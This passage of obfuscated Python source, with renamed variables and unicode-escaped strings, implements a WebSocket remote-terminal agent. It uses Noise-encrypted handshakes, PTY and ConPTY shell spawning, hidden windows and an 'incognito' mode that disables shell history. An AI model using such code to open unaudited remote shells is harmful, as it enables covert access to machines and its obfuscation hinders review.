        for O0_var_539 in (codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0052\\u0065\\u0073\\u0069\\u007a\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0043\\u006c\\u006f\\u0073\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065', 'unicode_escape'), codecs.decode('\\u0049\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074', 'unicode_escape'), codecs.decode('\\u0055\\u0070\\u0064\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065', 'unicode_escape')):
            if not hasattr(O0_var_538, O0_var_539):
                return None
        O0_var_538.CreatePseudoConsole.restype = ctypes.c_long
        O0_var_538.CreatePseudoConsole.argtypes = [_COORD, wintypes.HANDLE, wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE)]
        O0_var_538.ResizePseudoConsole.restype = ctypes.c_long
        O0_var_538.ResizePseudoConsole.argtypes = [wintypes.HANDLE, _COORD]
        O0_var_538.ClosePseudoConsole.restype = None
        O0_var_538.ClosePseudoConsole.argtypes = [wintypes.HANDLE]
        O0_var_538.InitializeProcThreadAttributeList.restype = wintypes.BOOL
        O0_var_538.InitializeProcThreadAttributeList.argtypes = [ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(ctypes.c_size_t)]
        O0_var_538.UpdateProcThreadAttribute.restype = wintypes.BOOL
        O0_var_538.UpdateProcThreadAttribute.argtypes = [ctypes.c_void_p, wintypes.DWORD, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.POINTER(ctypes.c_size_t)]
        O0_var_538.DeleteProcThreadAttributeList.restype = None
        O0_var_538.DeleteProcThreadAttributeList.argtypes = [ctypes.c_void_p]
        O0_var_538.CreateProcessW.restype = wintypes.BOOL
        O0_var_538.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.LPVOID, wintypes.LPVOID, wintypes.BOOL, wintypes.DWORD, wintypes.LPVOID, wintypes.LPCWSTR, ctypes.POINTER(_STARTUPINFOEX), ctypes.POINTER(_PROCESS_INFORMATION)]
        O0_var_538.CloseHandle.restype = wintypes.BOOL
        O0_var_538.CloseHandle.argtypes = [wintypes.HANDLE]
        return O0_var_538
    _KERNEL32 = _probe_conpty()

    def _windows_env_block(env: Dict[str, str]):
        O0_var_540 = codecs.decode('\\u0000', 'unicode_escape').join((str(O0_var_541) + codecs.decode('\\u003d', 'unicode_escape') + str(O0_var_542) for O0_var_541, O0_var_542 in env.items())) + codecs.decode('\\u0000', 'unicode_escape')
        return ctypes.create_unicode_buffer(O0_var_540)

    def _taskkill(O0_var_543: int):
        if not O0_var_543:
            return
        try:
            subprocess.run([codecs.decode('\\u0074\\u0061\\u0073\\u006b\\u006b\\u0069\\u006c\\u006c', 'unicode_escape'), codecs.decode('\\u002f\\u0046', 'unicode_escape'), codecs.decode('\\u002f\\u0054', 'unicode_escape'), codecs.decode('\\u002f\\u0050\\u0049\\u0044', 'unicode_escape'), str(O0_var_543)], creationflags=_CREATE_NO_WINDOW_FLAG, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
        except Exception:
            pass

    class _ConPtyTerminal:
        codecs.decode('\\u57fa\\u4e8e\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0020\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065\\u0020\\u0028\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0029\\u0020\\u7684\\u771f\\u5b9e\\u7ec8\\u7aef\\u5b9e\\u73b0', 'unicode_escape')

        def __init__(self, shell: str, env: Dict[str, str], O0_var_544: int, O0_var_545: int, cwd: str=None, args: list=None):
            self.shell = shell
            self.env = env
            self.rows = O0_var_544
            self.cols = O0_var_545
            self.cwd = cwd
            self.args = list(args or [])
            self._hpc = None
            self._attr_list = None
            self._in_r = self._in_w = None
            self._out_r = self._out_w = None
            self._h_process = None
            self.pid = 0

        def start(self):
            if _KERNEL32 is None:
                raise RuntimeError(codecs.decode('\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0020\\u4e0d\\u53ef\\u7528', 'unicode_escape'))
            O0_var_546, O0_var_547 = os.pipe()
            O0_var_548, O0_var_549 = os.pipe()
            try:
                O0_var_550 = msvcrt.get_osfhandle(O0_var_546)
                O0_var_551 = msvcrt.get_osfhandle(O0_var_549)
                O0_var_552 = wintypes.HANDLE()
                O0_var_553 = _KERNEL32.CreatePseudoConsole(_COORD(self.cols, self.rows), O0_var_550, O0_var_551, 0, ctypes.byref(O0_var_552))
                if O0_var_553 != 0:
                    raise OSError(codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0073\\u0065\\u0075\\u0064\\u006f\\u0043\\u006f\\u006e\\u0073\\u006f\\u006c\\u0065\\u0020\\u5931\\u8d25\\u0020\\u0028\\u0048\\u0052\\u0045\\u0053\\u0055\\u004c\\u0054\\u003d\\u0030\\u0078', 'unicode_escape') + format(O0_var_553 & 4294967295, codecs.decode('\\u0078', 'unicode_escape')) + codecs.decode('\\u0029', 'unicode_escape'))
                self._hpc = O0_var_552.value
                self._in_r, self._in_w = (O0_var_546, O0_var_547)
                self._out_r, self._out_w = (O0_var_548, O0_var_549)
                os.set_blocking(self._out_r, False)
                O0_var_554 = codecs.decode('\\u0022', 'unicode_escape') + str(self.shell) + codecs.decode('\\u0022', 'unicode_escape') if codecs.decode('\\u0020', 'unicode_escape') in self.shell else self.shell
                for O0_var_555 in self.args:
                    O0_var_554 += codecs.decode('\\u0020', 'unicode_escape') + (codecs.decode('\\u0022', 'unicode_escape') + str(O0_var_555) + codecs.decode('\\u0022', 'unicode_escape') if codecs.decode('\\u0020', 'unicode_escape') in O0_var_555 else O0_var_555)
                O0_var_556 = _windows_env_block(self.env)
                O0_var_557 = _STARTUPINFOEX()
                O0_var_557.cb = ctypes.sizeof(_STARTUPINFOEX)
                O0_var_557.dwFlags = _STARTF_USESTDHANDLES
                O0_var_558 = ctypes.c_size_t(0)
                _KERNEL32.InitializeProcThreadAttributeList(None, 1, 0, ctypes.byref(O0_var_558))
                O0_var_559 = ctypes.create_string_buffer(O0_var_558.value)
                if not _KERNEL32.InitializeProcThreadAttributeList(O0_var_559, 1, 0, ctypes.byref(O0_var_558)):
                    raise OSError(codecs.decode('\\u0049\\u006e\\u0069\\u0074\\u0069\\u0061\\u006c\\u0069\\u007a\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u004c\\u0069\\u0073\\u0074\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                if not _KERNEL32.UpdateProcThreadAttribute(O0_var_559, 0, _PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE, self._hpc, ctypes.sizeof(wintypes.HANDLE), None, None):
                    raise OSError(codecs.decode('\\u0055\\u0070\\u0064\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0054\\u0068\\u0072\\u0065\\u0061\\u0064\\u0041\\u0074\\u0074\\u0072\\u0069\\u0062\\u0075\\u0074\\u0065\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                self._attr_list = O0_var_559
                O0_var_557.lpAttributeList = ctypes.cast(O0_var_559, ctypes.c_void_p)
                O0_var_560 = _PROCESS_INFORMATION()
                O0_var_561 = _EXTENDED_STARTUPINFO_PRESENT | _CREATE_UNICODE_ENVIRONMENT
                O0_var_562 = _KERNEL32.CreateProcessW(None, O0_var_554, None, None, False, O0_var_561, ctypes.cast(O0_var_556, ctypes.c_void_p), self.cwd, ctypes.byref(O0_var_557), ctypes.byref(O0_var_560))
                if not O0_var_562:
                    raise OSError(codecs.decode('\\u0043\\u0072\\u0065\\u0061\\u0074\\u0065\\u0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0057\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(ctypes.get_last_error()))
                self._h_process = O0_var_560.hProcess
                self.pid = O0_var_560.dwProcessId
                if O0_var_560.hThread:
                    _KERNEL32.CloseHandle(O0_var_560.hThread)
            except Exception:
                self.close()
                raise

        def set_size(self, O0_var_563: int, O0_var_564: int):
            if self._hpc is None or _KERNEL32 is None:
                return
            try:
                _KERNEL32.ResizePseudoConsole(self._hpc, _COORD(O0_var_564, O0_var_563))
            except Exception:
                pass

        def read(self, O0_var_565: int) -> bytes:
            if self._out_r is None:
                return b''
            try:
                return os.read(self._out_r, O0_var_565)
            except BlockingIOError:
                return None

        def write(self, data: bytes) -> int:
            if self._in_w is None:
                return 0
            return os.write(self._in_w, data)

        def close(self):
            if self._hpc is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.ClosePseudoConsole(self._hpc)
                except Exception:
                    pass
                self._hpc = None
            if self._attr_list is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.DeleteProcThreadAttributeList(self._attr_list)
                except Exception:
                    pass
                self._attr_list = None
            if self._h_process is not None and _KERNEL32 is not None:
                try:
                    _KERNEL32.CloseHandle(self._h_process)
                except Exception:
                    pass
                self._h_process = None
            for O0_var_566 in (self._in_r, self._in_w, self._out_r, self._out_w):
                if O0_var_566 is not None:
                    try:
                        os.close(O0_var_566)
                    except Exception:
                        pass
            self._in_r = self._in_w = self._out_r = self._out_w = None

        def kill_tree(self):
            _taskkill(self.pid)

    class _PipeTerminal:
        codecs.decode('\\u65e7\\u7248\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ba1\\u9053\\u56de\\u9000\\u5b9e\\u73b0\\u0020\\u0028\\u65e0\\u0020\\u0043\\u006f\\u006e\\u0050\\u0054\\u0059\\u0029\\u003a\\u0020\\u65e0\\u771f\\u5b9e\\u7ec8\\u7aef\\u002c\\u0020\\u0072\\u0065\\u0073\\u0069\\u007a\\u0065\\u0020\\u4e3a\\u0020\\u006e\\u006f\\u002d\\u006f\\u0070', 'unicode_escape')

        def __init__(self, shell: str, env: Dict[str, str], O0_var_567: int, O0_var_568: int, cwd: str=None, args: list=None):
            self.shell = shell
            self.env = env
            self.cwd = cwd
            self.args = list(args or [])
            self._in_w = self._out_r = None
            self._proc = None
            self.pid = 0

        def start(self):
            O0_var_569, O0_var_570 = os.pipe()
            O0_var_571, O0_var_572 = os.pipe()
            self._proc = subprocess.Popen([self.shell] + self.args, stdin=O0_var_569, stdout=O0_var_572, stderr=O0_var_572, env=self.env, cwd=self.cwd, creationflags=_CREATE_NO_WINDOW_FLAG)
            os.close(O0_var_569)
            os.close(O0_var_572)
            self._in_w = O0_var_570
            self._out_r = O0_var_571
            os.set_blocking(self._out_r, False)
            self.pid = self._proc.pid

        def set_size(self, O0_var_573: int, O0_var_574: int):
            return None

        def read(self, O0_var_575: int) -> bytes:
            if self._out_r is None:
                return b''
            try:
                return os.read(self._out_r, O0_var_575)
            except BlockingIOError:
                return None

        def write(self, data: bytes) -> int:
            if self._in_w is None:
                return 0
            return os.write(self._in_w, data)

        def close(self):
            for O0_var_576 in (self._in_w, self._out_r):
                if O0_var_576 is not None:
                    try:
                        os.close(O0_var_576)
                    except Exception:
                        pass
            self._in_w = self._out_r = None
            if self._proc is not None:
                try:
                    if self._proc.poll() is None:
                        self._proc.terminate()
                except Exception:
                    pass
                self._proc = None

        def kill_tree(self):
            _taskkill(self.pid)

    def _create_windows_backend(shell: str, env: Dict[str, str], O0_var_577: int, O0_var_578: int, cwd: str=None, args: list=None):
        if _KERNEL32 is not None:
            return _ConPtyTerminal(shell, env, O0_var_577, O0_var_578, cwd, args)
        return _PipeTerminal(shell, env, O0_var_577, O0_var_578, cwd, args)

    def _windows_default_shell() -> str:
        O0_var_579 = shutil.which(codecs.decode('\\u0070\\u006f\\u0077\\u0065\\u0072\\u0073\\u0068\\u0065\\u006c\\u006c\\u002e\\u0065\\u0078\\u0065', 'unicode_escape'))
        if O0_var_579:
            return O0_var_579
        O0_var_580 = os.environ.get(codecs.decode('\\u0043\\u004f\\u004d\\u0053\\u0050\\u0045\\u0043', 'unicode_escape'))
        if O0_var_580 and os.path.exists(O0_var_580):
            return O0_var_580
        return codecs.decode('\\u0063\\u006d\\u0064\\u002e\\u0065\\u0078\\u0065', 'unicode_escape')
else:

    def _windows_default_shell() -> str:
        return codecs.decode('', 'unicode_escape')

    def _create_windows_backend(*args, **kwargs):
        raise RuntimeError(codecs.decode('\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u7ec8\\u7aef\\u540e\\u7aef\\u4ec5\\u652f\\u6301\\u0020\\u0057\\u0069\\u006e\\u0064\\u006f\\u0077\\u0073\\u0020\\u5e73\\u53f0', 'unicode_escape'))

class TerminalSessionHandler:

    def __init__(self):
        self.process = None
        self.master_fd = None
        self.slave_fd = None
        self.terminal = None
        self.meta_requested = False
        self.incognito_requested = False
        self.websocket: WebSocket = None
        self.request_id: str = None
        self.AGENT_PRIVATE_KEY = Config.keys[codecs.decode('\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape')].private_b64
        self.CONTROL_PUBLIC_KEY = Config.keys[codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape')].public_b64
        self.cipher = NoiseSessionWrapper(is_initiator=False, local_priv_b64=self.AGENT_PRIVATE_KEY, expected_remote_pub_b64=self.CONTROL_PUBLIC_KEY)

    def _read_key_file(self, O0_var_581: str) -> str:
        try:
            if os.path.exists(O0_var_581):
                with open(O0_var_581, codecs.decode('\\u0072', 'unicode_escape')) as O0_var_582:
                    return O0_var_582.read().strip()
            return None
        except Exception as e:
            Logger.error(codecs.decode('\\u8bfb\\u53d6\\u5bc6\\u94a5\\u6587\\u4ef6\\u0020', 'unicode_escape') + str(O0_var_581) + codecs.decode('\\u0020\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
            return None

    async def cleanup(self):
        if self.request_id:
            Logger.info(codecs.decode('\\u005b', 'unicode_escape') + str(self.request_id) + codecs.decode('\\u005d\\u0020\\u6267\\u884c\\u7ec8\\u7aef\\u8d44\\u6e90\\u6e05\\u7406\\u002e\\u002e\\u002e', 'unicode_escape'))
        O0_var_583 = getattr(self, codecs.decode('\\u0074\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c', 'unicode_escape'), None)
        if O0_var_583 is not None:
            O0_var_583.kill_tree()
            O0_var_583.close()
            self.terminal = None
        if self.process:
            try:
                if hasattr(os, codecs.decode('\\u006b\\u0069\\u006c\\u006c\\u0070\\u0067', 'unicode_escape')):
                    os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
                else:
                    self.process.terminate()
                try:
                    await asyncio.wait_for(self.process.wait(), timeout=2.0)
                except asyncio.TimeoutError:
                    self.process.kill()
            except Exception:
                pass
            self.process = None
        for O0_var_584 in [codecs.decode('\\u006d\\u0061\\u0073\\u0074\\u0065\\u0072\\u005f\\u0066\\u0064', 'unicode_escape'), codecs.decode('\\u0073\\u006c\\u0061\\u0076\\u0065\\u005f\\u0066\\u0064', 'unicode_escape')]:
            O0_var_585 = getattr(self, O0_var_584)
            if O0_var_585 is not None:
                try:
                    os.close(O0_var_585)
                except Exception:
                    pass
                setattr(self, O0_var_584, None)
        if self.websocket:
            try:
                await self.websocket.close(code=1000)
            except Exception:
                pass
            finally:
                self.websocket = None

    async def _do_noise_handshake(self, O0_var_586: WebSocket, O0_var_587):
        O0_var_587(codecs.decode('\\U0001f91d\\u0020\\u5f00\\u59cb\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u52a0\\u5bc6\\u63e1\\u624b\\u002e\\u002e\\u002e', 'unicode_escape'))
        try:
            O0_var_588 = await O0_var_586.receive_bytes()
            O0_var_589 = self.cipher.process_handshake(O0_var_588)
            await O0_var_586.send_bytes(O0_var_589)
            O0_var_590 = await O0_var_586.receive_bytes()
            self.cipher.process_handshake(O0_var_590)
            O0_var_591 = self.cipher.expected_remote_pub
            O0_var_592 = self.cipher.captured_remote_pub
            if not O0_var_591 or not O0_var_592 or (not hmac.compare_digest(O0_var_592, O0_var_591)):
                O0_var_587(codecs.decode('\\U0001f6a8\\u0020\\u7ec8\\u7aef\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u63e1\\u624b\\u5bf9\\u7aef\\u8eab\\u4efd\\u6821\\u9a8c\\u5931\\u8d25\\u002c\\u0020\\u62d2\\u7edd\\u4f1a\\u8bdd', 'unicode_escape'))
                try:
                    await O0_var_586.close(code=1008, reason=codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0070\\u0065\\u0065\\u0072\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'))
                except Exception:
                    pass
                raise PermissionError(codecs.decode('\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u0070\\u0065\\u0065\\u0072\\u0020\\u0073\\u0074\\u0061\\u0074\\u0069\\u0063\\u0020\\u006b\\u0065\\u0079\\u0020\\u0076\\u0065\\u0072\\u0069\\u0066\\u0069\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'))
            O0_var_587(codecs.decode('\\u2705\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u63e1\\u624b\\u5b8c\\u6210\\uff0c\\u7aef\\u5230\\u7aef\\u52a0\\u5bc6\\u901a\\u9053\\u5df2\\u5efa\\u7acb\\uff01', 'unicode_escape'))
        except PermissionError as e:
            O0_var_587(codecs.decode('\\U0001f6a8\\u0020\\u62d2\\u7edd\\u8bbf\\u95ee\\u003a\\u0020', 'unicode_escape') + str(e))
            raise
        except Exception as e:
            O0_var_587(codecs.decode('\\U0001f4a5\\u0020\\u63e1\\u624b\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))
            raise RuntimeError(codecs.decode('\\u52a0\\u5bc6\\u63e1\\u624b\\u5931\\u8d25', 'unicode_escape'))

    async def start_session(self, O0_var_593: WebSocket, O0_var_594: str, O0_var_595: bool=True, meta_requested: bool=False, incognito_requested: bool=False):
        self.websocket = O0_var_593
        self.request_id = O0_var_594
        self.use_noise = O0_var_595
        self.meta_requested = meta_requested
        self.incognito_requested = incognito_requested
        O0_var_596 = lambda msg: Logger.info(codecs.decode('\\u005b\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u0020', 'unicode_escape') + str(O0_var_594) + codecs.decode('\\u005d\\u0020', 'unicode_escape') + str(msg))
        O0_var_596(codecs.decode('\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u5df2\\u5efa\\u7acb\\uff0c\\u7b49\\u5f85\\u63a5\\u53d7\\u8fde\\u63a5\\u002e\\u002e\\u002e', 'unicode_escape'))
        try:
            await O0_var_593.accept()
            O0_var_596(codecs.decode('\\u2705\\u0020\\u0057\\u0065\\u0062\\u0053\\u006f\\u0063\\u006b\\u0065\\u0074\\u0020\\u8fde\\u63a5\\u5df2\\u63a5\\u53d7', 'unicode_escape'))
            if self.use_noise:
                await self._do_noise_handshake(O0_var_593, O0_var_596)
            else:
                O0_var_596(codecs.decode('\\u26a1\\u0020\\u8d70\\u0020\\u0048\\u0054\\u0054\\u0050\\u0053\\u0020\\u660e\\u6587\\u964d\\u7ea7\\u901a\\u9053\\uff0c\\u8df3\\u8fc7\\u0020\\u004e\\u006f\\u0069\\u0073\\u0065\\u0020\\u63e1\\u624b\\u3002', 'unicode_escape'))
            await self._run_terminal(O0_var_593, O0_var_594, O0_var_596)
        except WebSocketDisconnect:
            O0_var_596(codecs.decode('\\U0001f50c\\u0020\\u5ba2\\u6237\\u7aef\\u4e3b\\u52a8\\u65ad\\u5f00\\u8fde\\u63a5', 'unicode_escape'))
        except Exception as e:
            O0_var_596(codecs.decode('\\u274c\\u0020\\u7ec8\\u7aef\\u4f1a\\u8bdd\\u5f02\\u5e38\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(e))
        finally:
            await self.cleanup()
            O0_var_596(codecs.decode('\\u2705\\u0020\\u8d44\\u6e90\\u6e05\\u7406\\u5b8c\\u6bd5\\u003a\\u0020', 'unicode_escape') + str(O0_var_594))

    @staticmethod
    def get_available_shell():
        if _IS_WINDOWS:
            return _windows_default_shell()
        for O0_var_597 in [codecs.decode('\\u0062\\u0061\\u0073\\u0068', 'unicode_escape'), codecs.decode('\\u007a\\u0073\\u0068', 'unicode_escape'), codecs.decode('\\u0061\\u0073\\u0068', 'unicode_escape')]:
            O0_var_598 = shutil.which(O0_var_597)
            if O0_var_598:
                return O0_var_598
        O0_var_599 = os.environ.get(codecs.decode('\\u0053\\u0048\\u0045\\u004c\\u004c', 'unicode_escape'))
        if O0_var_599 and os.path.exists(O0_var_599) and os.access(O0_var_599, os.X_OK):
            return O0_var_599
        return shutil.which(codecs.decode('\\u0073\\u0068', 'unicode_escape')) or codecs.decode('\\u002f\\u0062\\u0069\\u006e\\u002f\\u0073\\u0068', 'unicode_escape')

    @staticmethod
    def _normalize_shell_name(shell_path: str) -> str:
        O0_var_600 = os.path.basename(shell_path or codecs.decode('', 'unicode_escape')).strip()
        if O0_var_600.lower().endswith(codecs.decode('\\u002e\\u0065\\u0078\\u0065', 'unicode_escape')):
            O0_var_600 = O0_var_600[:-4]
        return (O0_var_600 or codecs.decode('\\u0073\\u0068', 'unicode_escape')).lower()

    @staticmethod
    def _incognito_native_applied(shell_path: str) -> bool:
        if _IS_WINDOWS:
            return os.path.basename(shell_path or codecs.decode('', 'unicode_escape')).lower() in (codecs.decode('\\u0070\\u006f\\u0077\\u0065\\u0072\\u0073\\u0068\\u0065\\u006c\\u006c\\u002e\\u0065\\u0078\\u0065', 'unicode_escape'), codecs.decode('\\u0063\\u006d\\u0064\\u002e\\u0065\\u0078\\u0065', 'unicode_escape'))
        return True

    async def _send_welcome(self, O0_var_601: WebSocket, O0_var_602: str):
        if not self.meta_requested:
            return
        O0_var_603 = json.dumps({codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'): codecs.decode('\\u0077\\u0065\\u006c\\u0063\\u006f\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0073\\u0068\\u0065\\u006c\\u006c', 'unicode_escape'): self._normalize_shell_name(O0_var_602), codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'): O0_var_602, codecs.decode('\\u0069\\u006e\\u0063\\u006f\\u0067\\u006e\\u0069\\u0074\\u006f', 'unicode_escape'): bool(self.incognito_requested and self._incognito_native_applied(O0_var_602))}).encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'))
        await self._send_ws_bytes(O0_var_601, O0_var_603)

    def set_pty_size(self, O0_var_604: int, O0_var_605: int):
        O0_var_606 = getattr(self, codecs.decode('\\u0074\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c', 'unicode_escape'), None)
        if O0_var_606 is not None:
            O0_var_606.set_size(O0_var_604, O0_var_605)
            return
        if self.master_fd is not None:
            try:
                O0_var_607 = struct.pack(codecs.decode('\\u0048\\u0048\\u0048\\u0048', 'unicode_escape'), O0_var_604, O0_var_605, 0, 0)
                fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, O0_var_607)
            except Exception as e:
                Logger.warning(codecs.decode('\\u8bbe\\u7f6e\\u0020\\u0050\\u0054\\u0059\\u0020\\u5c3a\\u5bf8\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(e))

    async def _run_terminal(self, O0_var_608: WebSocket, O0_var_609: str, O0_var_610):
        self.master_fd = None
        self.slave_fd = None
        try:
            O0_var_611 = os.environ.copy()
            O0_var_611.pop(codecs.decode('\\u0050\\u0052\\u004f\\u004d\\u0050\\u0054\\u005f\\u0043\\u004f\\u004d\\u004d\\u0041\\u004e\\u0044', 'unicode_escape'), None)
            O0_var_611.setdefault(codecs.decode('\\u0054\\u0045\\u0052\\u004d', 'unicode_escape'), codecs.decode('\\u0078\\u0074\\u0065\\u0072\\u006d\\u002d\\u0032\\u0035\\u0036\\u0063\\u006f\\u006c\\u006f\\u0072', 'unicode_escape'))
            if codecs.decode('\\u004c\\u0041\\u004e\\u0047', 'unicode_escape') not in O0_var_611:
                O0_var_611[codecs.decode('\\u004c\\u0041\\u004e\\u0047', 'unicode_escape')] = codecs.decode('\\u0043\\u002e\\u0055\\u0054\\u0046\\u002d\\u0038', 'unicode_escape')
            if _IS_WINDOWS:
                await self._run_terminal_windows(O0_var_608, O0_var_609, O0_var_610, O0_var_611)
                return
            if self.incognito_requested:
                O0_var_611[codecs.decode('\\u0048\\u0049\\u0053\\u0054\\u0046\\u0049\\u004c\\u0045', 'unicode_escape')] = codecs.decode('\\u002f\\u0064\\u0065\\u0076\\u002f\\u006e\\u0075\\u006c\\u006c', 'unicode_escape')
            self.master_fd, self.slave_fd = pty.openpty()
            self.set_pty_size(24, 80)
            O0_var_612 = self.get_available_shell()
            O0_var_610(codecs.decode('\\U0001f41a\\u0020\\u4f7f\\u7528\\u0020\\u0053\\u0068\\u0065\\u006c\\u006c\\u0020\\u8def\\u5f84\\u003a\\u0020', 'unicode_escape') + str(O0_var_612))

            def pty_preexec():
                import termios, fcntl
                os.setsid()
                try:
                    fcntl.ioctl(0, termios.TIOCSCTTY, 0)
                except Exception:
                    pass
            self.process = await asyncio.create_subprocess_exec(O0_var_612, stdin=self.slave_fd, stdout=self.slave_fd, stderr=self.slave_fd, env=O0_var_611, preexec_fn=pty_preexec)
            O0_var_610(codecs.decode('\\U0001f680\\u0020\\u7ec8\\u7aef\\u8fdb\\u7a0b\\u5df2\\u542f\\u52a8\\u0020\\u0028\\u0050\\u0049\\u0044\\u003a\\u0020', 'unicode_escape') + str(self.process.pid) + codecs.decode('\\u0029', 'unicode_escape'))
            await self._send_welcome(O0_var_608, O0_var_612)
            if self.slave_fd is not None:
                os.close(self.slave_fd)
                self.slave_fd = None
            O0_var_613 = fcntl.fcntl(self.master_fd, fcntl.F_GETFL)
            fcntl.fcntl(self.master_fd, fcntl.F_SETFL, O0_var_613 | os.O_NONBLOCK)
            O0_var_614 = [asyncio.create_task(self._handle_pty_output(O0_var_608, self.master_fd, O0_var_610)), asyncio.create_task(self._handle_websocket_input(O0_var_608, self.master_fd, O0_var_610)), asyncio.create_task(self._monitor_process(self.process, O0_var_610))]
            O0_var_615, O0_var_616 = await asyncio.wait(O0_var_614, return_when=asyncio.FIRST_COMPLETED)
            for O0_var_617 in O0_var_616:
                O0_var_617.cancel()
            try:
                await O0_var_608.close(code=1000, reason=codecs.decode('\\u0054\\u0065\\u0072\\u006d\\u0069\\u006e\\u0061\\u006c\\u0020\\u0065\\u0078\\u0069\\u0074\\u0065\\u0064\\u0020\\u006e\\u006f\\u0072\\u006d\\u0061\\u006c\\u006c\\u0079', 'unicode_escape'))
            except Exception:
                pass
        except Exception as e:
            O0_var_610(codecs.decode('\\U0001f4a5\\u0020\\u542f\\u52a8\\u7ec8\\u7aef\\u5931\\u8d25\\u003a\\u0020', 'unicode_escape') + str(type(e).__name__) + codecs.decode('\\u0020\\u002d\\u0020', 'unicode_escape') + str(str(e)))
            await self.cleanup()
            raise

    async def _run_terminal_windows(self, O0_var_618: WebSocket, O0_var_619: str, O0_var_620, env: dict):
        try:
            O0_var_621 = self.get_available_shell()
            O0_var_620(codecs.decode('\\U0001f41a\\u0020\\u4f7f\\u7528\\u0020\\u0053\\u0068\\u0065\\u006c\\u006c\\u0020\\u8def\\u5f84\\u003a\\u0020', 'unicode_escape') + str(O0_var_621))
            O0_var_622 = []
            if self.incognito_requested and os.path.basename(O0_var_621).lower() == codecs.decode('\\u0070\\u006f\\u0077\\u0065\\u0072\\u0073\\u0068\\u0065\\u006c\\u006c\\u002e\\u0065\\u0078\\u0065', 'unicode_escape'):
